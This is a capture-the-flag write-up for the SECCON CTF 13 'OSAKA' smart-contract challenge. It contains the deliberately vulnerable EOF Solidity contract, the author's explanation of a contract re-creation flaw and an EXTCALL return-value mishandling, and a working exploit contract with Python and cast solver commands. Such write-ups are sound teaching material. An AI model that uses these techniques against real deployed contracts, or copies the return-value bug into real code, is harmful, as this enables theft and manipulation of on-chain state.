---
title: "Osaka - Seccon CTF 13 Quals"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["minaminao-my-ctf-challenges", "author-solution", "challenge-source", "solidity", "evm", "delegatecall", "proof-of-work", "subprocess", "blockchain", "seccon-ctf-13-quals"]
summary: "OSAKA is an EVM Object Format (EOF) challenge created for SECCON CTF 13 Quals."
source:
  name: "minaminao/my-ctf-challenges"
  url: "https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/osaka"
license: "none stated"
ctf:
  name: "Seccon CTF 13 Quals"
  challenge: "Osaka"
---

## Challenge

- **Author:** [minaminao](https://github.com/minaminao)
- **Source:** <https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/osaka>
- **CTF:** Seccon CTF 13 Quals

---

# OSAKA

**OSAKA** is an EVM Object Format (EOF) challenge created for SECCON CTF 13 Quals.

This directory includes:
- `build`: the challenge server based on [my previous challenge](../../hitcon-ctf-2024-quals/lustrous/).
- `files`: the distributed files for players
- `solver`: the author's solver

Solves: 2 / 653 teams in 24h.

## Description

THE NEXT EVOLUTION OF EVM.

```
nc osaka.seccon.games 31337
```

## Contract

The challenge contract is [OSAKA.sol](build/src/contracts/src/OSAKA.sol):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

interface IGame {
    function play(address solverAddr) external;
}

interface IStickGameSolver {
    function solve(uint256 sticks) external returns (uint256);
}

contract StickGame is IGame {
    uint256 public initialSticks;

    constructor(uint256 initialSticks_) {
        initialSticks = initialSticks_;
    }

    function play(address solverAddr) external {
        uint256 sticks = initialSticks;
        for (uint256 i = 0; i < 100; i++) {
            uint256 solverInput = IStickGameSolver(solverAddr).solve(sticks);
            require(solverInput > 0 && solverInput <= 3, "Invalid input");
            sticks -= solverInput;
            if (sticks == 0) {
                // you win :)
                return;
            }
            uint256 computerInput = sticks % 4 == 0 ? 1 : sticks % 4;
            sticks -= computerInput;
            if (sticks == 0) {
                revert("Computer wins");
            }
        }
    }
}

contract ChronoGame is IGame {
    function play(address) external view {
        if (block.timestamp > 5000000000) {
            // you win :)
            return;
        } else {
            revert("Computer wins");
        }
    }
}

contract GameRegistry {
    mapping(address => mapping(uint256 => IGame)) public games;

    function registerGame(uint256 gameSlot, address gameAddr) external {
        games[msg.sender][gameSlot] = IGame(gameAddr);
    }
}

contract GameMaster {
    GameRegistry public gameRegistry;
    mapping(uint256 => uint256) public playCounts;

    constructor(GameRegistry gameRegistry_) {
        gameRegistry = gameRegistry_;
    }

    function initializeGame(uint256 gameId, uint256 parameter) external {
        uint256 gameSlot = gameId;
        if (gameId == 1) {
            gameRegistry.registerGame(gameSlot, address(new StickGame(parameter)));
        } else if (gameId == 2) {
            gameRegistry.registerGame(gameSlot, address(new ChronoGame()));
        }
    }

    function playGame(uint256 gameSlot, address challenger) external {
        IGame game = gameRegistry.games(address(this), gameSlot);
        playCounts[gameSlot]++;
        game.play(challenger);
    }
}

contract OSAKA {
    bool public isSolved;
    GameRegistry public gameRegistry;
    GameMaster public gameMaster;

    constructor() payable {
        gameRegistry = new GameRegistry();
        gameMaster = new GameMaster(gameRegistry);
    }

    function challenge() external {
        assembly {
            if eq(tload(0), true) { revert(0, 0) }
            tstore(0, true)

            let gameMasterAddr := sload(gameMaster.slot)
            let win := true

            // initialize games
            for { let i := 1 } lt(i, 3) { i := add(i, 1) } {
                mstore(0x40, 100)
                mstore(0x20, i)
                mstore(0x00, 0x9122b600)
                pop(extcall(gameMasterAddr, 0x1c, 0x44, 0))
            }

            // play games
            for { let i := 1 } lt(i, 3) { i := add(i, 1) } {
                mstore(0x40, caller())
                mstore(0x20, i)
                mstore(0x00, 0x3505b06f)
                let reverted := extcall(gameMasterAddr, 0x1c, 0x44, 0)
                if eq(reverted, true) { win := false }
            }

            // you need to win all games
            if eq(win, false) { revert(0, 0) }
            sstore(isSolved.slot, true)
        }
    }
}
```

## Writeup

-> [solver/README.md](solver/README.md)

## Launch a challenge server

```
make start-challenge-server-local
```

## Access the challenge server

```
nc localhost 31337
```

Good luck!

## Run the author's solver

```
make run-solver-local
```


## Author's solver notes

# SECCON CTF 13 Quals - OSAKA - Author Writeup

The goal of this challenge is to make the `isSolved` function in the `OSAKA` contract, implemented using [EVM Object Format (EOF)](https://evmobjectformat.org/), return `true`.
The EOF contract was created using [forge-eof](https://github.com/paradigmxyz/forge-eof) released by Paradigm, which internally utilizes the [Solidity PoC](https://github.com/ipsilon/solidity) developed by the Ipsilon team.
The infrastructure is configured to enable EOF by using the `--odyssey` option in Anvil ([ref](https://www.ithaca.xyz/updates/odyssey)).

To make `isSolved()` return `true`, the `challenge` function must be fully executed, which includes running `sstore(isSolved.slot, true)`.
Thus, you must win two games: `StickGame` and `ChronoGame`.

However, it looks impossible to win either game under normal situations.
- For `StickGame`, a variation of [Nim](https://en.wikipedia.org/wiki/Nim), the computer is programmed always to win.
- For `ChronoGame`, winning requires waiting around 100 years.

So, what should you do?

Actually, there are two vulnerabilities related to EOF in this contract.
Exploiting them will help you solve this challenge.

## Vuln 1: Contract Recreation Failures

EOF introduces the `EOFCREATE` instruction for contract creation, deprecating the traditional `CREATE` and `CREATE2`.
When using `EOFCREATE`, a `salt` must be specified, similar to the behavior of the old `CREATE2`.

As a result, Solidity cannot redeploy the same bytecode contract without specifying a `salt`.
For example, the following code, which worked previously, will no longer execute (at least with the currently available Solidity PoC):

```solidity
new Contract(); // success
new Contract(); // fail 🤯
```

In this challenge, the `initializeGame` function is called from the `challenge` function to generate a `StickGame`.
However, if you directly call `initializeGame` beforehand and deploy a `StickGame`, the contract creation in the `challenge` function will fail.
By doing so, you can freely set the `initialSticks` for the `StickGame` and win the first game.

## Vuln 2: Call Return Mishandling

EOF uses the `EXTCALL` instruction for contract calls, deprecating the traditional `CALL` instruction, as well as `DELEGATECALL` and `STATICCALL`.

Unlike `CALL`, `EXTCALL` can return **three** values:
- `0`: success
- `1`: revert
- `2`: failure

In this contract, the return value of the `EXTCALL` instruction is checked while playing the game.

However, there is a vulnerability that a `2` (failure) return value is treated as a win:

```solidity
let reverted := extcall(gameMasterAddr, 0x1c, 0x44, 0)
if eq(reverted, true) { win := false }
```

Then, how can you achieve a return value of `2`?

In this challenge, you can trigger an Out-of-Gas condition to make `EXTCALL` return `2`.
This means that during `playGame` for the second game, `ChronoGame`, you need to trigger an Out-of-Gas condition.
The required gas limit can be calculated in some way (e.g., manual/programmatic binary search).

With this, you will win the second game.

## Final Step: Access Set

The above vulnerabilities will allow you to reach the final `sstore(isSolved.slot, true)`.

However, since the Out-of-Gas condition was triggered during the `playGame` call, the remaining gas will be insufficient to execute `SSTORE`, causing the transaction to revert due to Out-of-Gas.

This issue can be resolved by using an access set ([ref](https://www.evm.codes/about#access_list)).
Specifically, by calling the `isSolved` function before invoking `challenge` within the same transaction, you can save gas and write the `isSolved` slot.

## Exploit

The final exploit looks like this:

```solidity
contract Exploit {
    function exploit(OSAKA osaka) public {
        osaka.isSolved(); // for access set
        osaka.gameMaster().initializeGame(1, 1);
        osaka.challenge();
    }

    function solve(uint256 sticks) public pure returns (uint256) {
        return sticks;
    }
}
```

Deploy this contract and call the `exploit` function with a proper gas limit (e.g., `4632905`):

```
cast send $EXPLOIT_ADDR "exploit(address)" $INSTANCE_ADDR --private-key $PRIVATE_KEY --gas-limit 4632905
```

**Flag:** `SECCON{d3vc0n_054k4_w4s_fun_a8b3bdaa46f7d7d5}`

The exploit looks simple, but the challenge itself introduced some novel ideas, making it difficult to come up with a solution.
In fact, only two teams managed to solve it. Congratulations!


## Solver: `solve.py`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/osaka/solver/solve.py>

```python
import hashlib
import json
import os
import subprocess

from pwn import remote
from web3 import Web3

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "31337")

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recvuntil(b"action? ")
r.sendline(b"1")


def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


solve_pow(r)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode()
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"your address:")
player_addr = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
osaka_addr = r.recvline().strip().decode()
r.close()

web3 = Web3(Web3.HTTPProvider(rpc_url))

res = subprocess.run(
    [
        "cast",
        "send",
        "--private-key",
        private_key,
        "--rpc-url",
        rpc_url,
        "--json",
        "--create",
        json.loads(open("out/OSAKA.s.sol/Exploit.json").read())["bytecode"]["object"],
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
assert res.returncode == 0, res.stderr

exploit_addr = json.loads(res.stdout)["contractAddress"]
print("exploit address", exploit_addr)

res = subprocess.run(
    [
        "cast",
        "send",
        exploit_addr,
        "exploit(address)",
        osaka_addr,
        "--private-key",
        private_key,
        "--rpc-url",
        rpc_url,
        "--gas-limit",
        "4632905",
        "--json",
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
assert res.returncode == 0, res.stderr

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recv()
r.sendline(b"3")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: \n")
flag = r.recvline().strip()
print(flag)
```


## Solver: `OSAKA.s.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/osaka/solver/script/OSAKA.s.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {OSAKA} from "../src/OSAKA.sol";

// forge create script/OSAKA.s.sol:Exploit --private-key $PRIVATE_KEY
// cast run (cast send $EXPLOIT_ADDR "exploit(address)" $INSTANCE_ADDR --private-key $PRIVATE_KEY --gas-limit 4632905 --json | jq .transactionHash -r)

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        OSAKA osaka = OSAKA(vm.envAddress("INSTANCE_ADDR"));
        Exploit exploit = new Exploit();
        exploit.exploit(osaka);
        require(osaka.isSolved());
        vm.stopBroadcast();
    }
}

contract Exploit {
    function exploit(OSAKA osaka) public {
        osaka.isSolved(); // for access set
        osaka.gameMaster().initializeGame(1, 1);
        osaka.challenge();
    }

    function solve(uint256 sticks) public pure returns (uint256) {
        return sticks;
    }
}
```


## Solver: `OSAKA.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/osaka/solver/src/OSAKA.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

interface IGame {
    function play(address solverAddr) external;
}

interface IStickGameSolver {
    function solve(uint256 sticks) external returns (uint256);
}

contract StickGame is IGame {
    uint256 public initialSticks;

    constructor(uint256 initialSticks_) {
        initialSticks = initialSticks_;
    }

    function play(address solverAddr) external {
        uint256 sticks = initialSticks;
        for (uint256 i = 0; i < 100; i++) {
            uint256 solverInput = IStickGameSolver(solverAddr).solve(sticks);
            require(solverInput > 0 && solverInput <= 3, "Invalid input");
            sticks -= solverInput;
            if (sticks == 0) {
                // you win :)
                return;
            }
            uint256 computerInput = sticks % 4 == 0 ? 1 : sticks % 4;
            sticks -= computerInput;
            if (sticks == 0) {
                revert("Computer wins");
            }
        }
    }
}

contract ChronoGame is IGame {
    function play(address) external view {
        if (block.timestamp > 5000000000) {
            // you win :)
            return;
        } else {
            revert("Computer wins");
        }
    }
}

contract GameRegistry {
    mapping(address => mapping(uint256 => IGame)) public games;

    function registerGame(uint256 gameSlot, address gameAddr) external {
        games[msg.sender][gameSlot] = IGame(gameAddr);
    }
}

contract GameMaster {
    GameRegistry public gameRegistry;
    mapping(uint256 => uint256) public playCounts;

    constructor(GameRegistry gameRegistry_) {
        gameRegistry = gameRegistry_;
    }

    function initializeGame(uint256 gameId, uint256 parameter) external {
        uint256 gameSlot = gameId;
        if (gameId == 1) {
            gameRegistry.registerGame(gameSlot, address(new StickGame(parameter)));
        } else if (gameId == 2) {
            gameRegistry.registerGame(gameSlot, address(new ChronoGame()));
        }
    }

    function playGame(uint256 gameSlot, address challenger) external {
        IGame game = gameRegistry.games(address(this), gameSlot);
        playCounts[gameSlot]++;
        game.play(challenger);
    }
}

contract OSAKA {
    bool public isSolved;
    GameRegistry public gameRegistry;
    GameMaster public gameMaster;

    constructor() payable {
        gameRegistry = new GameRegistry();
        gameMaster = new GameMaster(gameRegistry);
    }

    function challenge() external {
        assembly {
            if eq(tload(0), true) { revert(0, 0) }
            tstore(0, true)

            let gameMasterAddr := sload(gameMaster.slot)
            let win := true

            // initialize games
            for { let i := 1 } lt(i, 3) { i := add(i, 1) } {
                mstore(0x40, 100)
                mstore(0x20, i)
                mstore(0x00, 0x9122b600)
                pop(extcall(gameMasterAddr, 0x1c, 0x44, 0))
            }

            // play games
            for { let i := 1 } lt(i, 3) { i := add(i, 1) } {
                mstore(0x40, caller())
                mstore(0x20, i)
                mstore(0x00, 0x3505b06f)
                let reverted := extcall(gameMasterAddr, 0x1c, 0x44, 0)
                if eq(reverted, true) { win := false }
            }

            // you need to win all games
            if eq(win, false) { revert(0, 0) }
            sstore(isSolved.slot, true)
        }
    }
}
```
